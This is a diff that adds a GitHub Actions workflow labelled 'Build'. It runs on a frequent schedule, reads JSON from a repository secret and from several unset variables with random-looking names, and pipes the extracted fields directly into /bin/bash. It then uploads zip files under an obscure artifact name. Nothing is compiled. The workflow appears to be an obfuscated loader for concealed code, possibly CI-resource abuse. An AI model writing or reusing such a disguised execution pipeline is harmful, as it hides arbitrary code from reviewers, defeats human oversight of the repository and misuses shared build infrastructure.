@@ -1,0 +1,33 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '55 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          gcbqn33: ${{ secrets.gcbqn33 }}
+        run: |
+          printf '%s' "$gcbqn33" | jq -r .ambfa175 | /bin/bash
+          echo $isier94 | jq -r .wb8 | /bin/bash
+          echo $zss6889 | jq -r .yiah4699 | /bin/bash
+          echo $x91539 | jq -r .szce2942 | /bin/bash
+          printf '%s' "$dzd1170" | jq -r .kvqfe7 | /bin/bash
+          printf '%s' "$jaxey8438" | jq -r .fltoc1 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mAVisCf8
+          path: "*.zip"
+          retention-days: 1
